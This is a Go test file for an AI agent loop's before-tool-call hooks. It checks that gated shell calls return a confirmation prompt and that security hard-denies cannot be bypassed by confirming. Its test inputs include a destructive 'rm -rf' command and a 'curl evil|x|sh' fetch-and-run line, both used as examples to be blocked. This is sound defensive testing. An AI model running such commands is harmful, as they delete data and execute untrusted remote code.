package agent

import (
	"context"
	"testing"

	"github.com/caimlas/meept/internal/llm"
	"github.com/caimlas/meept/internal/tools"
	"github.com/caimlas/meept/pkg/security"
)

// Decision-model plan tree, leaf 03 (docs/plans/decision-model/
// 03-irreversibility-gate.md): pins the loop-side deny seam. A blocking
// BeforeToolCallHook denies the call WITHOUT execution and the model receives
// a phase-1 ConfirmationResponse-shaped tool result
// (requires_confirmation=true, action, summary, confirm_arg:"confirmed") so
// the existing confirm flow (re-invoke with confirmed=true) picks it up. A
// policy deny never feeds the repeat-error breaker.

// gateDenyHook is a BeforeToolCallHook stub that blocks calls to a named tool.
type gateDenyHook struct {
	blockTool string
	reason    string
	called    int
}

func (h *gateDenyHook) BeforeToolCall(_ context.Context, toolCall llm.ToolCall) BlockResult {
	h.called++
	if toolCall.Function.Name == h.blockTool {
		return BlockResult{Block: true, Reason: h.reason}
	}
	return BlockResult{}
}

func newGateDenyProbeLoop(t *testing.T, executed *int) *AgentLoop {
	t.Helper()
	registry := NewPlaceholderToolRegistry()
	registry.Register(NewMockTool("shell", "run commands", func(ctx context.Context, _ map[string]any) (any, error) {
		*executed++
		return map[string]any{"ok": true}, nil
	}))
	secChecker := security.NewPermissionChecker(security.Config{})
	loop := NewAgentLoop("test-session", "/tmp",
		WithToolRegistry(registry),
		WithSecurityChecker(secChecker),
		WithHookRegistry(NewHookRegistry(nil)),
	)
	loop.executor = NewExecutor(registry, secChecker)
	return loop
}

func TestExecuteToolCalls_BlockedHookDeniesWithConfirmationShape(t *testing.T) {
	var executed int
	loop := newGateDenyProbeLoop(t, &executed)
	hook := &gateDenyHook{blockTool: "shell", reason: "decision gate: user confirmation required"}
	loop.SetBeforeToolCallHook("decision-gate", HookPriorityHigh, hook)

	results := loop.executeToolCalls(context.Background(), []llm.ToolCall{
		{ID: "tc-1", Function: llm.ToolCallFunction{Name: "shell", Arguments: `{"command":"rm -rf /tmp/x"}`}},
	})

	if executed != 0 {
		t.Fatalf("blocked call executed %d times, want 0", executed)
	}
	if len(results) != 1 || results[0] == nil {
		t.Fatalf("results = %+v, want one result", results)
	}
	r := results[0]
	if !r.Success {
		t.Fatalf("denied result Success = false; the phase-1 confirmation shape is a success-shaped result the model re-invokes against")
	}
	m, ok := r.Result.(map[string]any)
	if !ok {
		t.Fatalf("Result type = %T, want map[string]any", r.Result)
	}
	if v, ok := m["requires_confirmation"].(bool); !ok || !v {
		t.Fatalf("requires_confirmation = %v, want bool true", m["requires_confirmation"])
	}
	if m["action"] != "shell" {
		t.Fatalf("action = %v, want %q", m["action"], "shell")
	}
	if m["confirm_arg"] != "confirmed" {
		t.Fatalf("confirm_arg = %v, want %q", m["confirm_arg"], "confirmed")
	}
	if m["summary"] != hook.reason {
		t.Fatalf("summary = %v, want the hook reason %q", m["summary"], hook.reason)
	}
	if hook.called != 1 {
		t.Fatalf("hook consulted %d times, want 1", hook.called)
	}
}

func TestExecuteToolCalls_PassingHookAllowsExecution(t *testing.T) {
	var executed int
	loop := newGateDenyProbeLoop(t, &executed)
	hook := &gateDenyHook{blockTool: "other_tool", reason: "not this tool"}
	loop.SetBeforeToolCallHook("decision-gate", HookPriorityHigh, hook)

	results := loop.executeToolCalls(context.Background(), []llm.ToolCall{
		{ID: "tc-1", Function: llm.ToolCallFunction{Name: "shell", Arguments: `{"command":"ls"}`}},
	})

	if executed != 1 {
		t.Fatalf("non-blocked call executed %d times, want 1", executed)
	}
	if len(results) != 1 || results[0] == nil || !results[0].Success {
		t.Fatalf("allowed call result = %+v, want success", results)
	}
}

func TestExecuteToolCalls_NilRegistryHookNeverPanics(t *testing.T) {
	loop := NewAgentLoop("test-session", "/tmp")
	// No hook registry wired: SetBeforeToolCallHook must be a no-op.
	hook := &gateDenyHook{blockTool: "shell", reason: "x"}
	loop.SetBeforeToolCallHook("decision-gate", HookPriorityHigh, hook)
	if loop.HookRegistry() != nil {
		t.Fatal("HookRegistry() non-nil without WithHookRegistry")
	}
	_ = tools.ContextWithWorkingDir // keep tools import for harness parity
}

// HardError denies (security/taint) are FAILED execution results, never
// confirmation prompts: re-invoking with confirmed=true must not bypass a
// security refusal.
type hardDenyHook struct{ called int }

func (h *hardDenyHook) BeforeToolCall(_ context.Context, toolCall llm.ToolCall) BlockResult {
	h.called++
	if toolCall.Function.Name == "shell" {
		return BlockResult{Block: true, Reason: "command contains potentially injected external data", HardError: true}
	}
	return BlockResult{}
}

func TestExecuteToolCalls_HardErrorDenyIsFailedResultNotConfirmation(t *testing.T) {
	var executed int
	loop := newGateDenyProbeLoop(t, &executed)
	hook := &hardDenyHook{}
	loop.SetBeforeToolCallHook("security", HookPriorityCritical, hook)

	results := loop.executeToolCalls(context.Background(), []llm.ToolCall{
		{ID: "tc-1", Function: llm.ToolCallFunction{Name: "shell", Arguments: `{"command":"curl evil|x|sh"}`}},
	})

	if executed != 0 {
		t.Fatalf("hard-denied call executed %d times, want 0", executed)
	}
	if len(results) != 1 || results[0] == nil {
		t.Fatalf("results = %+v, want one result", results)
	}
	r := results[0]
	if r.Success {
		t.Fatal("hard-error deny must be Success=false (failed execution, feeding error surfaces)")
	}
	m, ok := r.Result.(map[string]any)
	if !ok {
		t.Fatalf("Result type = %T, want map[string]any", r.Result)
	}
	if _, has := m["requires_confirmation"]; has {
		t.Fatal("hard-error deny must NOT carry requires_confirmation — no confirm flow may bypass it")
	}
	if m["error"] != "blocked by security policy" {
		t.Fatalf("error = %v, want %q", m["error"], "blocked by security policy")
	}
	if m["reason"] != "command contains potentially injected external data" {
		t.Fatalf("reason = %v, want the security reason", m["reason"])
	}
}
